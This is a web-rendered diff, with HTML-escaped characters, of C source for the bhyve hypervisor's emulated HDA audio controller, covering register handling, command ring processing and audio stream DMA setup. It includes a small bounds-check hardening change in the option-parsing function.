+ #define HDA_DMA_PIB_ENTRY_LEN	0x08
+ #define HDA_STREAM_TAGS_CNT	0x10
+ #define HDA_STREAM_REGS_BASE	0x80
+ #define HDA_STREAM_REGS_LEN	0x20
+ 
+ #define HDA_DMA_ACCESS_LEN	(sizeof(uint32_t))
+ #define HDA_BDL_MAX_LEN		0x0100
+ 
+ #define HDAC_SDSTS_FIFORDY	(1 &amp;lt;&amp;lt; 5)
+ 
+ #define HDA_RIRBSTS_IRQ_MASK	(HDAC_RIRBSTS_RINTFL | HDAC_RIRBSTS_RIRBOIS)
+ #define HDA_STATESTS_IRQ_MASK	((1 &amp;lt;&amp;lt; HDA_CODEC_MAX) - 1)
+ #define HDA_SDSTS_IRQ_MASK					\
+ 	(HDAC_SDSTS_DESE | HDAC_SDSTS_FIFOE | HDAC_SDSTS_BCIS)
+ 
+ /*
+  * HDA data structures
+  */
+ 
+ struct hda_softc;
+ 
+ typedef void (*hda_set_reg_handler)(struct hda_softc *sc, uint32_t offset,
+ 		uint32_t old);
+ 
+ struct hda_bdle {
+ 	uint32_t addrh;
+ 	uint32_t addrl;
+ 	uint32_t ioc;
+ 	uint32_t len;
+ } __packed;
+ 
+ struct hda_bdle_desc {
+ 	void *addr;
+ 	uint8_t ioc;
+ 	uint32_t len;
+ };
+ 
+ struct hda_codec_cmd_ctl {
+ 	char *name;
+ 	void *dma_vaddr;
+ 	uint8_t run;
+ 	uint16_t rp;
+ 	uint16_t size;
+ 	uint16_t wp;
+ };
+ 
+ struct hda_stream_desc {
+ 	uint8_t dir;
+ 	uint8_t run;
+ 	uint8_t stream;
+ 
+ 	/* bp is the no. of bytes transferred in the current bdle */
+ 	uint32_t bp;
+ 	/* be is the no. of bdles transferred in the bdl */
+ 	uint32_t be;
+ 
+ 	uint32_t bdl_cnt;
+ 	struct hda_bdle_desc bdl[HDA_BDL_MAX_LEN];
+ };
+ 
+ struct hda_softc {
+ 	struct pci_devinst *pci_dev;
+ 	uint32_t regs[HDA_LAST_OFFSET];
+ 
+ 	uint8_t lintr;
+ 	uint8_t rirb_cnt;
+ 	uint64_t wall_clock_start;
+ 
+ 	struct hda_codec_cmd_ctl corb;
+ 	struct hda_codec_cmd_ctl rirb;
+ 
+ 	uint8_t codecs_no;
+ 	struct hda_codec_inst *codecs[HDA_CODEC_MAX];
+ 
+ 	/* Base Address of the DMA Position Buffer */
+ 	void *dma_pib_vaddr;
+ 
+ 	struct hda_stream_desc streams[HDA_IOSS_NO];
+ 	/* 2 tables for output and input */
+ 	uint8_t stream_map[2][HDA_STREAM_TAGS_CNT];
+ };
+ 
+ /*
+  * HDA module function declarations
+  */
+ static inline void hda_set_reg_by_offset(struct hda_softc *sc, uint32_t offset,
+     uint32_t value);
+ static inline uint32_t hda_get_reg_by_offset(struct hda_softc *sc,
+     uint32_t offset);
+ static inline void hda_set_field_by_offset(struct hda_softc *sc,
+     uint32_t offset, uint32_t mask, uint32_t value);
+ 
+ static uint8_t hda_parse_config(const char *opts, const char *key, char *val);
+ static struct hda_softc *hda_init(const char *opts);
+ static void hda_update_intr(struct hda_softc *sc);
+ static void hda_response_interrupt(struct hda_softc *sc);
+ static int hda_codec_constructor(struct hda_softc *sc,
+     struct hda_codec_class *codec, const char *play, const char *rec,
+     const char *opts);
+ static struct hda_codec_class *hda_find_codec_class(const char *name);
+ 
+ static int hda_send_command(struct hda_softc *sc, uint32_t verb);
+ static int hda_notify_codecs(struct hda_softc *sc, uint8_t run,
+     uint8_t stream, uint8_t dir);
+ static void hda_reset(struct hda_softc *sc);
+ static void hda_reset_regs(struct hda_softc *sc);
+ static void hda_stream_reset(struct hda_softc *sc, uint8_t stream_ind);
+ static int hda_stream_start(struct hda_softc *sc, uint8_t stream_ind);
+ static int hda_stream_stop(struct hda_softc *sc, uint8_t stream_ind);
+ static uint32_t hda_read(struct hda_softc *sc, uint32_t offset);
+ static int hda_write(struct hda_softc *sc, uint32_t offset, uint8_t size,
+     uint32_t value);
+ 
+ static inline void hda_print_cmd_ctl_data(struct hda_codec_cmd_ctl *p);
+ static int hda_corb_start(struct hda_softc *sc);
+ static int hda_corb_run(struct hda_softc *sc);
+ static int hda_rirb_start(struct hda_softc *sc);
+ 
+ static void *hda_dma_get_vaddr(struct hda_softc *sc, uint64_t dma_paddr,
+     size_t len);
+ static void hda_dma_st_dword(void *dma_vaddr, uint32_t data);
+ static uint32_t hda_dma_ld_dword(void *dma_vaddr);
+ 
+ static inline uint8_t hda_get_stream_by_offsets(uint32_t offset,
+     uint8_t reg_offset);
+ static inline uint32_t hda_get_offset_stream(uint8_t stream_ind);
+ 
+ static void hda_set_gctl(struct hda_softc *sc, uint32_t offset, uint32_t old);
+ static void hda_set_statests(struct hda_softc *sc, uint32_t offset,
+     uint32_t old);
+ static void hda_set_corbwp(struct hda_softc *sc, uint32_t offset, uint32_t old);
+ static void hda_set_corbctl(struct hda_softc *sc, uint32_t offset,
+     uint32_t old);
+ static void hda_set_rirbctl(struct hda_softc *sc, uint32_t offset,
+     uint32_t old);
+ static void hda_set_rirbsts(struct hda_softc *sc, uint32_t offset,
+     uint32_t old);
+ static void hda_set_dpiblbase(struct hda_softc *sc, uint32_t offset,
+     uint32_t old);
+ static void hda_set_sdctl(struct hda_softc *sc, uint32_t offset, uint32_t old);
+ static void hda_set_sdctl2(struct hda_softc *sc, uint32_t offset, uint32_t old);
+ static void hda_set_sdsts(struct hda_softc *sc, uint32_t offset, uint32_t old);
+ 
+ static int hda_signal_state_change(struct hda_codec_inst *hci);
+ static int hda_response(struct hda_codec_inst *hci, uint32_t response,
+     uint8_t unsol);
+ static int hda_transfer(struct hda_codec_inst *hci, uint8_t stream,
+     uint8_t dir, void *buf, size_t count);
+ 
+ static void hda_set_pib(struct hda_softc *sc, uint8_t stream_ind, uint32_t pib);
+ static uint64_t hda_get_clock_ns(void);
+ 
+ /*
+  * PCI HDA function declarations
+  */
+ static int pci_hda_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts);
+ static void pci_hda_write(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
+     int baridx, uint64_t offset, int size, uint64_t value);
+ static uint64_t pci_hda_read(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
+     int baridx, uint64_t offset, int size);
+ /*
+  * HDA global data
+  */
+ 
+ static const hda_set_reg_handler hda_set_reg_table[] = {
+ 	[HDAC_GCTL] = hda_set_gctl,
+ 	[HDAC_STATESTS] = hda_set_statests,
+ 	[HDAC_CORBWP] = hda_set_corbwp,
+ 	[HDAC_CORBCTL] = hda_set_corbctl,
+ 	[HDAC_RIRBCTL] = hda_set_rirbctl,
+ 	[HDAC_RIRBSTS] = hda_set_rirbsts,
+ 	[HDAC_DPIBLBASE] = hda_set_dpiblbase,
+ 
+ #define HDAC_ISTREAM(n, iss, oss)				\
+ 	[_HDAC_ISDCTL(n, iss, oss)] = hda_set_sdctl,		\
+ 	[_HDAC_ISDCTL(n, iss, oss) + 2] = hda_set_sdctl2,	\
+ 	[_HDAC_ISDSTS(n, iss, oss)] = hda_set_sdsts,		\
+ 
+ #define HDAC_OSTREAM(n, iss, oss)				\
+ 	[_HDAC_OSDCTL(n, iss, oss)] = hda_set_sdctl,		\
+ 	[_HDAC_OSDCTL(n, iss, oss) + 2] = hda_set_sdctl2,	\
+ 	[_HDAC_OSDSTS(n, iss, oss)] = hda_set_sdsts,		\
+ 
+ 	HDAC_ISTREAM(0, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_ISTREAM(1, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_ISTREAM(2, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_ISTREAM(3, HDA_ISS_NO, HDA_OSS_NO)
+ 
+ 	HDAC_OSTREAM(0, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_OSTREAM(1, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_OSTREAM(2, HDA_ISS_NO, HDA_OSS_NO)
+ 	HDAC_OSTREAM(3, HDA_ISS_NO, HDA_OSS_NO)
+ 
+ 	[HDA_SET_REG_TABLE_SZ] = NULL,
+ };
+ 
+ static const uint16_t hda_corb_sizes[] = {
+ 	[HDAC_CORBSIZE_CORBSIZE_2]	= 2,
+ 	[HDAC_CORBSIZE_CORBSIZE_16]	= 16,
+ 	[HDAC_CORBSIZE_CORBSIZE_256]	= 256,
+ 	[HDAC_CORBSIZE_CORBSIZE_MASK]	= 0,
+ };
+ 
+ static const uint16_t hda_rirb_sizes[] = {
+ 	[HDAC_RIRBSIZE_RIRBSIZE_2]	= 2,
+ 	[HDAC_RIRBSIZE_RIRBSIZE_16]	= 16,
+ 	[HDAC_RIRBSIZE_RIRBSIZE_256]	= 256,
+ 	[HDAC_RIRBSIZE_RIRBSIZE_MASK]	= 0,
+ };
+ 
+ static struct hda_ops hops = {
+ 	.signal		= hda_signal_state_change,
+ 	.response	= hda_response,
+ 	.transfer	= hda_transfer,
+ };
+ 
+ struct pci_devemu pci_de_hda = {
+ 	.pe_emu		= &quot;hda&quot;,
+ 	.pe_init	= pci_hda_init,
+ 	.pe_barwrite	= pci_hda_write,
+ 	.pe_barread	= pci_hda_read
+ };
+ 
+ PCI_EMUL_SET(pci_de_hda);
+ 
+ SET_DECLARE(hda_codec_class_set, struct hda_codec_class);
+ 
+ #if DEBUG_HDA == 1
+ FILE *dbg;
+ #endif
+ 
+ /*
+  * HDA module function definitions
+  */
+ 
+ static inline void
+ hda_set_reg_by_offset(struct hda_softc *sc, uint32_t offset, uint32_t value)
+ {
+ 	assert(offset &amp;lt; HDA_LAST_OFFSET);
+ 	sc-&amp;gt;regs[offset] = value;
+ }
+ 
+ static inline uint32_t
+ hda_get_reg_by_offset(struct hda_softc *sc, uint32_t offset)
+ {
+ 	assert(offset &amp;lt; HDA_LAST_OFFSET);
+ 	return sc-&amp;gt;regs[offset];
+ }
+ 
+ static inline void
+ hda_set_field_by_offset(struct hda_softc *sc, uint32_t offset,
+     uint32_t mask, uint32_t value)
+ {
+ 	uint32_t reg_value = 0;
+ 
+ 	reg_value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	reg_value &amp;amp;= ~mask;
+ 	reg_value |= (value &amp;amp; mask);
+ 
+ 	hda_set_reg_by_offset(sc, offset, reg_value);
+ }
+ 
+ static uint8_t
+ hda_parse_config(const char *opts, const char *key, char *val)
+ {
+ 	char buf[64];
+ 	char *s = buf;
+ 	char *tmp = NULL;
+&lt;span class=&quot;gd&quot;&gt;-	int len;
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+	size_t len;
+&lt;/span&gt; 	int i;
+ 
+ 	if (!opts)
+ 		return (0);
+ 
+ 	len = strlen(opts);
+&lt;span class=&quot;gd&quot;&gt;-
+-	if (len &amp;gt;= 64) {
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+	if (len &amp;gt;= sizeof(buf)) {
+&lt;/span&gt; 		DPRINTF(&quot;Opts too big\n&quot;);
+ 		return (0);
+ 	}
+ 
+ 	DPRINTF(&quot;opts: %s\n&quot;, opts);
+ 
+ 	strcpy(buf, opts);
+ 
+ 	for (i = 0; i &amp;lt; len; i++)
+ 		if (buf[i] == ',') {
+ 			buf[i] = 0;
+ 			tmp = buf + i + 1;
+ 			break;
+ 		}
+ 
+ 	if (!memcmp(s, key, strlen(key))) {
+ 		strncpy(val, s + strlen(key), 64);
+ 		return (1);
+ 	}
+ 
+ 	if (!tmp)
+ 		return (0);
+ 
+ 	s = tmp;
+ 	if (!memcmp(s, key, strlen(key))) {
+ 		strncpy(val, s + strlen(key), 64);
+ 		return (1);
+ 	}
+ 
+ 	return (0);
+ }
+ 
+ static struct hda_softc *
+ hda_init(const char *opts)
+ {
+ 	struct hda_softc *sc = NULL;
+ 	struct hda_codec_class *codec = NULL;
+ 	char play[64];
+ 	char rec[64];
+ 	int err, p, r;
+ 
+ #if DEBUG_HDA == 1
+ 	dbg = fopen(&quot;/tmp/bhyve_hda.log&quot;, &quot;w+&quot;);
+ #endif
+ 
+ 	DPRINTF(&quot;opts: %s\n&quot;, opts);
+ 
+ 	sc = calloc(1, sizeof(*sc));
+ 	if (!sc)
+ 		return (NULL);
+ 
+ 	hda_reset_regs(sc);
+ 
+ 	/*
+ 	 * TODO search all the codecs declared in opts
+ 	 * For now we play with one single codec
+ 	 */
+ 	codec = hda_find_codec_class(&quot;hda_codec&quot;);
+ 	if (codec) {
+ 		p = hda_parse_config(opts, &quot;play=&quot;, play);
+ 		r = hda_parse_config(opts, &quot;rec=&quot;, rec);
+ 		DPRINTF(&quot;play: %s rec: %s\n&quot;, play, rec);
+ 		if (p | r) {
+ 			err = hda_codec_constructor(sc, codec, p ?	\
+ 				play : NULL, r ? rec : NULL, NULL);
+ 			assert(!err);
+ 		}
+ 	}
+ 
+ 	return (sc);
+ }
+ 
+ static void
+ hda_update_intr(struct hda_softc *sc)
+ {
+ 	struct pci_devinst *pi = sc-&amp;gt;pci_dev;
+ 	uint32_t intctl = hda_get_reg_by_offset(sc, HDAC_INTCTL);
+ 	uint32_t intsts = 0;
+ 	uint32_t sdsts = 0;
+ 	uint32_t rirbsts = 0;
+ 	uint32_t wakeen = 0;
+ 	uint32_t statests = 0;
+ 	uint32_t off = 0;
+ 	int i;
+ 
+ 	/* update the CIS bits */
+ 	rirbsts = hda_get_reg_by_offset(sc, HDAC_RIRBSTS);
+ 	if (rirbsts &amp;amp; (HDAC_RIRBSTS_RINTFL | HDAC_RIRBSTS_RIRBOIS))
+ 		intsts |= HDAC_INTSTS_CIS;
+ 
+ 	wakeen = hda_get_reg_by_offset(sc, HDAC_WAKEEN);
+ 	statests = hda_get_reg_by_offset(sc, HDAC_STATESTS);
+ 	if (statests &amp;amp; wakeen)
+ 		intsts |= HDAC_INTSTS_CIS;
+ 
+ 	/* update the SIS bits */
+ 	for (i = 0; i &amp;lt; HDA_IOSS_NO; i++) {
+ 		off = hda_get_offset_stream(i);
+ 		sdsts = hda_get_reg_by_offset(sc, off + HDAC_SDSTS);
+ 		if (sdsts &amp;amp; HDAC_SDSTS_BCIS)
+ 			intsts |= (1 &amp;lt;&amp;lt; i);
+ 	}
+ 
+ 	/* update the GIS bit */
+ 	if (intsts)
+ 		intsts |= HDAC_INTSTS_GIS;
+ 
+ 	hda_set_reg_by_offset(sc, HDAC_INTSTS, intsts);
+ 
+ 	if ((intctl &amp;amp; HDAC_INTCTL_GIE) &amp;amp;&amp;amp; ((intsts &amp;amp;			\
+ 		~HDAC_INTSTS_GIS) &amp;amp; intctl)) {
+ 		if (!sc-&amp;gt;lintr) {
+ 			pci_lintr_assert(pi);
+ 			sc-&amp;gt;lintr = 1;
+ 		}
+ 	} else {
+ 		if (sc-&amp;gt;lintr) {
+ 			pci_lintr_deassert(pi);
+ 			sc-&amp;gt;lintr = 0;
+ 		}
+ 	}
+ }
+ 
+ static void
+ hda_response_interrupt(struct hda_softc *sc)
+ {
+ 	uint8_t rirbctl = hda_get_reg_by_offset(sc, HDAC_RIRBCTL);
+ 
+ 	if ((rirbctl &amp;amp; HDAC_RIRBCTL_RINTCTL) &amp;amp;&amp;amp; sc-&amp;gt;rirb_cnt) {
+ 		sc-&amp;gt;rirb_cnt = 0;
+ 		hda_set_field_by_offset(sc, HDAC_RIRBSTS, HDAC_RIRBSTS_RINTFL,
+ 				HDAC_RIRBSTS_RINTFL);
+ 		hda_update_intr(sc);
+ 	}
+ }
+ 
+ static int
+ hda_codec_constructor(struct hda_softc *sc, struct hda_codec_class *codec,
+     const char *play, const char *rec, const char *opts)
+ {
+ 	struct hda_codec_inst *hci = NULL;
+ 
+ 	if (sc-&amp;gt;codecs_no &amp;gt;= HDA_CODEC_MAX)
+ 		return (-1);
+ 
+ 	hci = calloc(1, sizeof(struct hda_codec_inst));
+ 	if (!hci)
+ 		return (-1);
+ 
+ 	hci-&amp;gt;hda = sc;
+ 	hci-&amp;gt;hops = &amp;amp;hops;
+ 	hci-&amp;gt;cad = sc-&amp;gt;codecs_no;
+ 	hci-&amp;gt;codec = codec;
+ 
+ 	sc-&amp;gt;codecs[sc-&amp;gt;codecs_no++] = hci;
+ 
+ 	if (!codec-&amp;gt;init) {
+ 		DPRINTF(&quot;This codec does not implement the init function\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	return (codec-&amp;gt;init(hci, play, rec, opts));
+ }
+ 
+ static struct hda_codec_class *
+ hda_find_codec_class(const char *name)
+ {
+ 	struct hda_codec_class **pdpp = NULL, *pdp = NULL;
+ 
+ 	SET_FOREACH(pdpp, hda_codec_class_set) {
+ 		pdp = *pdpp;
+ 		if (!strcmp(pdp-&amp;gt;name, name)) {
+ 			return (pdp);
+ 		}
+ 	}
+ 
+ 	return (NULL);
+ }
+ 
+ static int
+ hda_send_command(struct hda_softc *sc, uint32_t verb)
+ {
+ 	struct hda_codec_inst *hci = NULL;
+ 	struct hda_codec_class *codec = NULL;
+ 	uint8_t cad = (verb &amp;gt;&amp;gt; HDA_CMD_CAD_SHIFT) &amp;amp; 0x0f;
+ 
+ 	hci = sc-&amp;gt;codecs[cad];
+ 	if (!hci)
+ 		return (-1);
+ 
+ 	DPRINTF(&quot;cad: 0x%x verb: 0x%x\n&quot;, cad, verb);
+ 
+ 	codec = hci-&amp;gt;codec;
+ 	assert(codec);
+ 
+ 	if (!codec-&amp;gt;command) {
+ 		DPRINTF(&quot;This codec does not implement the command function\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	return (codec-&amp;gt;command(hci, verb));
+ }
+ 
+ static int
+ hda_notify_codecs(struct hda_softc *sc, uint8_t run, uint8_t stream,
+     uint8_t dir)
+ {
+ 	struct hda_codec_inst *hci = NULL;
+ 	struct hda_codec_class *codec = NULL;
+ 	int err;
+ 	int i;
+ 
+ 	/* Notify each codec */
+ 	for (i = 0; i &amp;lt; sc-&amp;gt;codecs_no; i++) {
+ 		hci = sc-&amp;gt;codecs[i];
+ 		assert(hci);
+ 
+ 		codec = hci-&amp;gt;codec;
+ 		assert(codec);
+ 
+ 		if (codec-&amp;gt;notify) {
+ 			err = codec-&amp;gt;notify(hci, run, stream, dir);
+ 			if (!err)
+ 				break;
+ 		}
+ 	}
+ 
+ 	return (i == sc-&amp;gt;codecs_no ? (-1) : 0);
+ }
+ 
+ static void
+ hda_reset(struct hda_softc *sc)
+ {
+ 	int i;
+ 	struct hda_codec_inst *hci = NULL;
+ 	struct hda_codec_class *codec = NULL;
+ 
+ 	hda_reset_regs(sc);
+ 
+ 	/* Reset each codec */
+ 	for (i = 0; i &amp;lt; sc-&amp;gt;codecs_no; i++) {
+ 		hci = sc-&amp;gt;codecs[i];
+ 		assert(hci);
+ 
+ 		codec = hci-&amp;gt;codec;
+ 		assert(codec);
+ 
+ 		if (codec-&amp;gt;reset)
+ 			codec-&amp;gt;reset(hci);
+ 	}
+ 
+ 	sc-&amp;gt;wall_clock_start = hda_get_clock_ns();
+ }
+ 
+ static void
+ hda_reset_regs(struct hda_softc *sc)
+ {
+ 	uint32_t off = 0;
+ 	uint8_t i;
+ 
+ 	DPRINTF(&quot;Reset the HDA controller registers ...\n&quot;);
+ 
+ 	memset(sc-&amp;gt;regs, 0, sizeof(sc-&amp;gt;regs));
+ 
+ 	hda_set_reg_by_offset(sc, HDAC_GCAP,
+ 			HDAC_GCAP_64OK |
+ 			(HDA_ISS_NO &amp;lt;&amp;lt; HDAC_GCAP_ISS_SHIFT) |
+ 			(HDA_OSS_NO &amp;lt;&amp;lt; HDAC_GCAP_OSS_SHIFT));
+ 	hda_set_reg_by_offset(sc, HDAC_VMAJ, 0x01);
+ 	hda_set_reg_by_offset(sc, HDAC_OUTPAY, 0x3c);
+ 	hda_set_reg_by_offset(sc, HDAC_INPAY, 0x1d);
+ 	hda_set_reg_by_offset(sc, HDAC_CORBSIZE,
+ 	    HDAC_CORBSIZE_CORBSZCAP_256 | HDAC_CORBSIZE_CORBSIZE_256);
+ 	hda_set_reg_by_offset(sc, HDAC_RIRBSIZE,
+ 	    HDAC_RIRBSIZE_RIRBSZCAP_256 | HDAC_RIRBSIZE_RIRBSIZE_256);
+ 
+ 	for (i = 0; i &amp;lt; HDA_IOSS_NO; i++) {
+ 		off = hda_get_offset_stream(i);
+ 		hda_set_reg_by_offset(sc, off + HDAC_SDFIFOS, HDA_FIFO_SIZE);
+ 	}
+ }
+ 
+ static void
+ hda_stream_reset(struct hda_softc *sc, uint8_t stream_ind)
+ {
+ 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
+ 	uint32_t off = hda_get_offset_stream(stream_ind);
+ 
+ 	DPRINTF(&quot;Reset the HDA stream: 0x%x\n&quot;, stream_ind);
+ 
+ 	/* Reset the Stream Descriptor registers */
+ 	memset(sc-&amp;gt;regs + HDA_STREAM_REGS_BASE + off, 0, HDA_STREAM_REGS_LEN);
+ 
+ 	/* Reset the Stream Descriptor */
+ 	memset(st, 0, sizeof(*st));
+ 
+ 	hda_set_field_by_offset(sc, off + HDAC_SDSTS,
+ 	    HDAC_SDSTS_FIFORDY, HDAC_SDSTS_FIFORDY);
+ 	hda_set_field_by_offset(sc, off + HDAC_SDCTL0,
+ 	    HDAC_SDCTL_SRST, HDAC_SDCTL_SRST);
+ }
+ 
+ static int
+ hda_stream_start(struct hda_softc *sc, uint8_t stream_ind)
+ {
+ 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
+ 	struct hda_bdle_desc *bdle_desc = NULL;
+ 	struct hda_bdle *bdle = NULL;
+ 	uint32_t lvi = 0;
+ 	uint32_t bdl_cnt = 0;
+ 	uint64_t bdpl = 0;
+ 	uint64_t bdpu = 0;
+ 	uint64_t bdl_paddr = 0;
+ 	void *bdl_vaddr = NULL;
+ 	uint32_t bdle_sz = 0;
+ 	uint64_t bdle_addrl = 0;
+ 	uint64_t bdle_addrh = 0;
+ 	uint64_t bdle_paddr = 0;
+ 	void *bdle_vaddr = NULL;
+ 	uint32_t off = hda_get_offset_stream(stream_ind);
+ 	uint32_t sdctl = 0;
+ 	uint8_t strm = 0;
+ 	uint8_t dir = 0;
+ 	int i;
+ 
+ 	assert(!st-&amp;gt;run);
+ 
+ 	lvi = hda_get_reg_by_offset(sc, off + HDAC_SDLVI);
+ 	bdpl = hda_get_reg_by_offset(sc, off + HDAC_SDBDPL);
+ 	bdpu = hda_get_reg_by_offset(sc, off + HDAC_SDBDPU);
+ 
+ 	bdl_cnt = lvi + 1;
+ 	assert(bdl_cnt &amp;lt;= HDA_BDL_MAX_LEN);
+ 
+ 	bdl_paddr = bdpl | (bdpu &amp;lt;&amp;lt; 32);
+ 	bdl_vaddr = hda_dma_get_vaddr(sc, bdl_paddr,
+ 	    HDA_BDL_ENTRY_LEN * bdl_cnt);
+ 	if (!bdl_vaddr) {
+ 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	DPRINTF(&quot;stream: 0x%x bdl_cnt: 0x%x bdl_paddr: 0x%lx\n&quot;,
+ 	    stream_ind, bdl_cnt, bdl_paddr);
+ 
+ 	st-&amp;gt;bdl_cnt = bdl_cnt;
+ 
+ 	bdle = (struct hda_bdle *)bdl_vaddr;
+ 	for (i = 0; i &amp;lt; bdl_cnt; i++, bdle++) {
+ 		bdle_sz = bdle-&amp;gt;len;
+ 		assert(!(bdle_sz % HDA_DMA_ACCESS_LEN));
+ 
+ 		bdle_addrl = bdle-&amp;gt;addrl;
+ 		bdle_addrh = bdle-&amp;gt;addrh;
+ 
+ 		bdle_paddr = bdle_addrl | (bdle_addrh &amp;lt;&amp;lt; 32);
+ 		bdle_vaddr = hda_dma_get_vaddr(sc, bdle_paddr, bdle_sz);
+ 		if (!bdle_vaddr) {
+ 			DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
+ 			return (-1);
+ 		}
+ 
+ 		bdle_desc = &amp;amp;st-&amp;gt;bdl[i];
+ 		bdle_desc-&amp;gt;addr = bdle_vaddr;
+ 		bdle_desc-&amp;gt;len = bdle_sz;
+ 		bdle_desc-&amp;gt;ioc = bdle-&amp;gt;ioc;
+ 
+ 		DPRINTF(&quot;bdle: 0x%x bdle_sz: 0x%x\n&quot;, i, bdle_sz);
+ 	}
+ 
+ 	sdctl = hda_get_reg_by_offset(sc, off + HDAC_SDCTL0);
+ 	strm = (sdctl &amp;gt;&amp;gt; 20) &amp;amp; 0x0f;
+ 	dir = stream_ind &amp;gt;= HDA_ISS_NO;
+ 
+ 	DPRINTF(&quot;strm: 0x%x, dir: 0x%x\n&quot;, strm, dir);
+ 
+ 	sc-&amp;gt;stream_map[dir][strm] = stream_ind;
+ 	st-&amp;gt;stream = strm;
+ 	st-&amp;gt;dir = dir;
+ 	st-&amp;gt;bp = 0;
+ 	st-&amp;gt;be = 0;
+ 
+ 	hda_set_pib(sc, stream_ind, 0);
+ 
+ 	st-&amp;gt;run = 1;
+ 
+ 	hda_notify_codecs(sc, 1, strm, dir);
+ 
+ 	return (0);
+ }
+ 
+ static int
+ hda_stream_stop(struct hda_softc *sc, uint8_t stream_ind)
+ {
+ 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
+ 	uint8_t strm = st-&amp;gt;stream;
+ 	uint8_t dir = st-&amp;gt;dir;
+ 
+ 	DPRINTF(&quot;stream: 0x%x, strm: 0x%x, dir: 0x%x\n&quot;, stream_ind, strm, dir);
+ 
+ 	st-&amp;gt;run = 0;
+ 
+ 	hda_notify_codecs(sc, 0, strm, dir);
+ 
+ 	return (0);
+ }
+ 
+ static uint32_t
+ hda_read(struct hda_softc *sc, uint32_t offset)
+ {
+ 	if (offset == HDAC_WALCLK)
+ 		return (24 * (hda_get_clock_ns() -			\
+ 			sc-&amp;gt;wall_clock_start) / 1000);
+ 
+ 	return (hda_get_reg_by_offset(sc, offset));
+ }
+ 
+ static int
+ hda_write(struct hda_softc *sc, uint32_t offset, uint8_t size, uint32_t value)
+ {
+ 	uint32_t old = hda_get_reg_by_offset(sc, offset);
+ 	uint32_t masks[] = {0x00000000, 0x000000ff, 0x0000ffff,
+ 			0x00ffffff, 0xffffffff};
+ 	hda_set_reg_handler set_reg_handler = hda_set_reg_table[offset];
+ 
+ 	hda_set_field_by_offset(sc, offset, masks[size], value);
+ 
+ 	if (set_reg_handler)
+ 		set_reg_handler(sc, offset, old);
+ 
+ 	return (0);
+ }
+ 
+ static inline void
+ hda_print_cmd_ctl_data(struct hda_codec_cmd_ctl *p)
+ {
+ #if DEBUG_HDA == 1
+ 	char *name = p-&amp;gt;name;
+ #endif
+ 	DPRINTF(&quot;%s size: %d\n&quot;, name, p-&amp;gt;size);
+ 	DPRINTF(&quot;%s dma_vaddr: %p\n&quot;, name, p-&amp;gt;dma_vaddr);
+ 	DPRINTF(&quot;%s wp: 0x%x\n&quot;, name, p-&amp;gt;wp);
+ 	DPRINTF(&quot;%s rp: 0x%x\n&quot;, name, p-&amp;gt;rp);
+ }
+ 
+ static int
+ hda_corb_start(struct hda_softc *sc)
+ {
+ 	struct hda_codec_cmd_ctl *corb = &amp;amp;sc-&amp;gt;corb;
+ 	uint8_t corbsize = 0;
+ 	uint64_t corblbase = 0;
+ 	uint64_t corbubase = 0;
+ 	uint64_t corbpaddr = 0;
+ 
+ 	corb-&amp;gt;name = &quot;CORB&quot;;
+ 
+ 	corbsize = hda_get_reg_by_offset(sc, HDAC_CORBSIZE) &amp;amp;		\
+ 		   HDAC_CORBSIZE_CORBSIZE_MASK;
+ 	corb-&amp;gt;size = hda_corb_sizes[corbsize];
+ 
+ 	if (!corb-&amp;gt;size) {
+ 		DPRINTF(&quot;Invalid corb size\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	corblbase = hda_get_reg_by_offset(sc, HDAC_CORBLBASE);
+ 	corbubase = hda_get_reg_by_offset(sc, HDAC_CORBUBASE);
+ 
+ 	corbpaddr = corblbase | (corbubase &amp;lt;&amp;lt; 32);
+ 	DPRINTF(&quot;CORB dma_paddr: %p\n&quot;, (void *)corbpaddr);
+ 
+ 	corb-&amp;gt;dma_vaddr = hda_dma_get_vaddr(sc, corbpaddr,
+ 			HDA_CORB_ENTRY_LEN * corb-&amp;gt;size);
+ 	if (!corb-&amp;gt;dma_vaddr) {
+ 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	corb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_CORBWP);
+ 	corb-&amp;gt;rp = hda_get_reg_by_offset(sc, HDAC_CORBRP);
+ 
+ 	corb-&amp;gt;run = 1;
+ 
+ 	hda_print_cmd_ctl_data(corb);
+ 
+ 	return (0);
+ }
+ 
+ static int
+ hda_corb_run(struct hda_softc *sc)
+ {
+ 	struct hda_codec_cmd_ctl *corb = &amp;amp;sc-&amp;gt;corb;
+ 	uint32_t verb = 0;
+ 	int err;
+ 
+ 	corb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_CORBWP);
+ 
+ 	while (corb-&amp;gt;rp != corb-&amp;gt;wp &amp;amp;&amp;amp; corb-&amp;gt;run) {
+ 		corb-&amp;gt;rp++;
+ 		corb-&amp;gt;rp %= corb-&amp;gt;size;
+ 
+ 		verb = hda_dma_ld_dword(corb-&amp;gt;dma_vaddr +		\
+ 				HDA_CORB_ENTRY_LEN * corb-&amp;gt;rp);
+ 
+ 		err = hda_send_command(sc, verb);
+ 		assert(!err);
+ 	}
+ 
+ 	hda_set_reg_by_offset(sc, HDAC_CORBRP, corb-&amp;gt;rp);
+ 
+ 	if (corb-&amp;gt;run)
+ 		hda_response_interrupt(sc);
+ 
+ 	return (0);
+ }
+ 
+ static int
+ hda_rirb_start(struct hda_softc *sc)
